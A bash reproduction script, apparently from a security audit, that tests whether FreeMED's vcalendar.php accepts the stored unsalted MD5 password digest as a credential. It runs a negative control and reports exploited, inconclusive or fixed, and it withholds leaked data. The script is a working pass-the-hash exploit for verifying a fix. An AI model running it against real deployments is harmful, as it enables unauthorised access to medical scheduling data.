#!/usr/bin/env bash
#
# repro-vcalendar-hash.sh - hostile repro for vcalendar.php "pass the hash"
#
# freemed_get_auth() compares the GET `hash` parameter directly against the
# stored userpassword column:
#   SELECT ... FROM user WHERE username='<user>' AND userpassword='<hash>'
# The stored column is an unsalted MD5 digest, so anyone who can read the
# database (see repro-help-traversal.sh) - or who guesses - can authenticate and
# pull calendar data without ever knowing the password. The digest IS the
# credential in this attack, which is why the request URL is printed in full:
# it is the injected payload, and an evidence file has to show what produced a
# leak.
#
# Usage:
#   BASE=http://localhost:38081 FREEMED_TEST_USER=admin FREEMED_TEST_PW=... \
#     ./repro-vcalendar-hash.sh
#
# Environment (no credential is ever hardcoded):
#   BASE              base URL of the deployment (default http://localhost:38081)
#   FREEMED_TEST_USER user to authenticate as (default "admin" - a username, not a secret)
#   FREEMED_TEST_PW   password whose MD5 is sent as `hash` (NO default: the probe
#                     fails closed, exit 2, when it is empty - MD5('') is not a
#                     credential and would report a meaningless "not vulnerable")
#   TIMEOUT           per-request curl timeout in seconds (default 20)
#
# NEGATIVE CONTROL (why this probe is not a second false-clean)
#
# A 0-byte 200 is what an endpoint that never got as far as answering looks
# like, and it is also what an accepted-but-eventless calendar looks like. So
# the script fires the same request a second time with a hash that cannot match
# any credential and compares: a "not vulnerable" verdict is only printed when
# the two responses DIFFER in a way that distinguishes rejected from accepted.
# When they are indistinguishable (measured on the FreeMED verify stack:
# 200 / text/html / 0 bytes for a valid digest, a bogus digest and no digest at
# all) the probe exits 2 - INCONCLUSIVE - because nothing was measured, and a
# clean pass would be a lie.
#
# Expect pre-fix where the endpoint works: HTTP 200 with
# Content-Type: text/x-vCalendar and a BEGIN:VCALENDAR body. Expect post-fix:
# "Not authorized." and no calendar body.
#
# Exit codes:
#   0  measured negative - the digest was demonstrably rejected
#   1  EXPLOITED - the MD5 digest alone was accepted
#   2  inconclusive - FREEMED_TEST_PW empty, no md5 implementation, no response,
#      or accepted/rejected responses are indistinguishable
#
# Only `set -u` is used; a failed curl must not abort the run.
set -u

BASE="${BASE:-http://localhost:38081}"
FREEMED_TEST_USER="${FREEMED_TEST_USER:-admin}"
FREEMED_TEST_PW="${FREEMED_TEST_PW:-}"
TIMEOUT="${TIMEOUT:-20}"
TMPDIR="${TMPDIR:-/tmp}"

# Fail closed before anything else: with an empty password this probe would send
# MD5('') and report a clean "not vulnerable", which is not a measurement.
if [ -z "$FREEMED_TEST_PW" ]; then
  cat >&2 <<EOF
repro: INCONCLUSIVE - FREEMED_TEST_PW is empty, so there is nothing to hash.

This probe replays MD5(FREEMED_TEST_PW) as the \`hash\` parameter. With an empty
password it would send MD5('') and report "not vulnerable" without ever sending
a real credential - a false clean. Refusing to run.

  FREEMED_TEST_USER=admin FREEMED_TEST_PW=<password> BASE=<url> $(basename "$0")

Never hardcode the password here: it belongs in the environment only.
EOF
  exit 2
fi

# Temp files: mktemp only, no predictable fallback path anywhere.
mk_tmp() {
  local f
  f="$(mktemp "${TMPDIR%/}/$1.XXXXXX")" || return 1
  printf '%s' "$f"
}
MKTMP_FAIL='repro: mktemp failed - refusing to fall back to a predictable path'
BODY="$(mk_tmp freemed-vcal-body)"       || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }
HDR="$(mk_tmp freemed-vcal-hdr)"         || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }
CTLBODY="$(mk_tmp freemed-vcal-ctl-body)" || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }
CTLHDR="$(mk_tmp freemed-vcal-ctl-hdr)"  || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }

cleanup() { rm -f "$BODY" "$HDR" "$CTLBODY" "$CTLHDR"; return 0; }
on_signal() {
  printf '\nrepro: interrupted\n' >&2
  cleanup
  exit 130
}
trap cleanup EXIT
trap on_signal INT TERM HUP

md5_of() {
  if command -v md5sum >/dev/null 2>&1; then
    printf '%s' "$1" | md5sum | cut -d' ' -f1
  elif command -v md5 >/dev/null 2>&1; then
    printf '%s' "$1" | md5
  elif command -v openssl >/dev/null 2>&1; then
    printf '%s' "$1" | openssl dgst -md5 | awk '{print $NF}'
  else
    return 1
  fi
}

HASH="$(md5_of "$FREEMED_TEST_PW")" || {
  printf 'repro: no md5 implementation found (md5sum/md5/openssl); cannot build the hash\n' >&2
  exit 2
}
# Negative control: a digest derived from a random nonce, so it cannot be any
# stored userpassword. Built here, never from the environment.
NONCE="repro-nonexistent-$$-${RANDOM:-0}-$(date +%s 2>/dev/null)"
CTL_HASH="$(md5_of "$NONCE")" || CTL_HASH='ffffffffffffffffffffffffffffffff'

printf 'repro: vcalendar.php pass-the-hash (GET hash = MD5(password)) + negative control\n'
printf 'base=%s  user=%s  pw=%s  hash=%s (the replayed digest - this IS the attack payload)\n' \
  "$BASE" "$FREEMED_TEST_USER" \
  "$([ -n "$FREEMED_TEST_PW" ] && printf '<set>' || printf '<empty>')" "$HASH"
printf 'note: a response body is printed only when no leak marker matched it; a matched\n'
printf '      body is reported by size and marker name, bytes withheld.\n\n'

P_CODE=""
P_CTYPE=""
probe() { # url hdrfile bodyfile -> prints the row, sets P_CODE / P_CTYPE
  local url="$1" hdrf="$2" bodyf="$3"
  printf 'GET %s\n' "$url"
  P_CODE="$(curl -s --max-time "$TIMEOUT" -D "$hdrf" -o "$bodyf" -w '%{http_code}' "$url")"
  P_CODE="${P_CODE:-000}"
  P_CTYPE="$(grep -i '^content-type:' "$hdrf" | head -n 1 | tr -d '\r' | sed 's/^[Cc]ontent-[Tt]ype: *//')"
  printf 'HTTP %s\n' "$P_CODE"
  printf 'Content-Type: %s  bytes=%s\n' "${P_CTYPE:-<none>}" "$(wc -c <"$bodyf" | tr -d ' ')"
}

# The URL is the payload - printed in full so the evidence shows the request that
# produced a leak. The plaintext password is never printed, written to a file, or
# placed on a command line.
probe "$BASE/vcalendar.php?user=$FREEMED_TEST_USER&hash=$HASH" "$HDR" "$BODY"
CODE="$P_CODE"
CTYPE="$P_CTYPE"
printf '\n'

if [ "$CODE" = "000" ]; then
  printf '>>> RESULT: INCONCLUSIVE - no response from %s\n' "$BASE"
  exit 2
fi

# Leak markers on the accepted-credential response.
matched=0
if printf '%s' "$CTYPE" | grep -qi 'x-vCalendar'; then
  matched=1
  printf '>>> EXPLOITED: hash-only auth accepted (Content-Type: text/x-vCalendar)\n'
fi
if grep -q 'BEGIN:VCALENDAR' "$BODY"; then
  matched=1
  printf '>>> EXPLOITED: iCalendar payload served without the plaintext password\n'
fi

if [ "$matched" -eq 1 ]; then
  printf 'body(%s bytes): WITHHELD - a leak marker matched, so no calendar bytes are printed\n' \
    "$(wc -c <"$BODY" | tr -d ' ')"
  printf '>>> RESULT: EXPLOITED - vcalendar.php accepts the stored MD5 digest as proof of identity\n'
  exit 1
fi

# Negative control: the same request with a digest that cannot match anything.
printf -- '-- negative control: digest that cannot match any credential\n'
probe "$BASE/vcalendar.php?user=$FREEMED_TEST_USER&hash=$CTL_HASH" "$CTLHDR" "$CTLBODY"
CTL_CODE="$P_CODE"
CTL_CTYPE="$P_CTYPE"
CTL_BYTES="$(wc -c <"$CTLBODY" | tr -d ' ')"
printf 'body(no leak marker matched, excerpt as received): %s\n\n' \
  "$(head -c 160 "$CTLBODY" | tr '\n\r\t' '   ')"

if [ "$CTL_CODE" = "000" ]; then
  printf '>>> RESULT: INCONCLUSIVE - the negative control got no response, so nothing was proven\n'
  exit 2
fi
if [ "$CTL_CODE" = "$CODE" ] && [ "$CTL_CTYPE" = "$CTYPE" ] && cmp -s "$BODY" "$CTLBODY"; then
  printf '>>> RESULT: INCONCLUSIVE - the accepted-credential response and the negative control are\n'
  printf '    indistinguishable (both HTTP %s, Content-Type %s, identical %s-byte body),\n' \
    "$CODE" "${CTYPE:-<none>}" "$CTL_BYTES"
  printf '    so this endpoint cannot show whether the digest was accepted or rejected here.\n'
  printf '    Nothing was measured: do NOT read this as "not vulnerable".\n'
  printf '    Check the endpoint by hand (syslog/error log, or a request that reaches the\n'
  printf '    calendar code, e.g. with the physician/type/day parameters this file expects)\n'
  printf '    before treating vcalendar as fixed.\n'
  exit 2
fi

printf 'body(no leak marker matched, excerpt as received): %s\n' \
  "$(head -c 160 "$BODY" | tr '\n\r\t' '   ')"
if grep -qi 'Not authorized' "$BODY"; then
  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0) - rejected ("Not authorized.",\n'
  printf '    HTTP %s), and the negative control differs from this response\n' "$CODE"
else
  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0) - no calendar body returned\n'
  printf '    (HTTP %s) and the negative control differs from this response\n' "$CODE"
fi
exit 0
